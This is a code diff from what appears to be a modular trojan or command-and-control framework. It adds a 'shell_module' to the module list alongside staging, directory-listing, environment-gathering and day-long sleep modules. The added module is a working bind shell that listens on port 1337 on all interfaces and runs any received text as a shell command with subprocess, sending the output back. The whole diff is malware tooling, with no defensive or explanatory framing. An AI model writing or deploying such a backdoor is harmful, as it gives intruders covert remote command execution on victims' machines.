@@ -59,8 +59,59 @@ def run(**args):
     print('[!] Sleep for a day')
     time.sleep(random.randint(86000,86800))
                         '''
-        
-        self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h)]
+        self.shell_module = '''
+ #!/usr/bin/env python3
+
+import sys
+import socket
+import threading
+import subprocess
+
+
+def server_loop():
+    host = '0.0.0.0'
+    port = 1337
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen()
+
+    client_socket, addr = server.accept()
+    print(f'Incoming -> {addr}')
+    client_thread = threading.Thread(
+        target=client_handler, args=(
+            client_socket, ))
+    client_thread.start()
+
+def client_handler(socket_obj):
+    while True:
+        socket_obj.send(b'<NCPy:#> ')
+        cmd_buffer = b''
+        while b'\n' not in cmd_buffer:
+            cmd_buffer += socket_obj.recv(1024)
+        if cmd_buffer.strip() == b'EXIT':
+            print('\n')
+            sys.exit()
+        response = run_command(cmd_buffer)
+        socket_obj.send(response)
+
+def run_command(command: str):
+        command = command.rstrip()
+        try:
+            output = subprocess.check_output(
+                command, stderr=subprocess.STDOUT, shell=True)
+        except BaseException:
+            output = f'Failed to execute {command} command on host:1337.\r\n'.encode()
+        return output
+
+def main():
+    server_loop()
+
+if __name__ == '__main__':
+    main()
+    
+'''
+        self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h), ('shell_module',self.shell_module)]
         self.word_list_ick = ('nick', 'pick', 'wick', 'brick', 'click', 'flick', 'quick', 'slick')
         self.word_list_ock = ('dock', 'lock', 'rock', 'sock', 'tock', 'block', 'clock', 'flock')
         self.filename_out = 'client_notes.txt'   
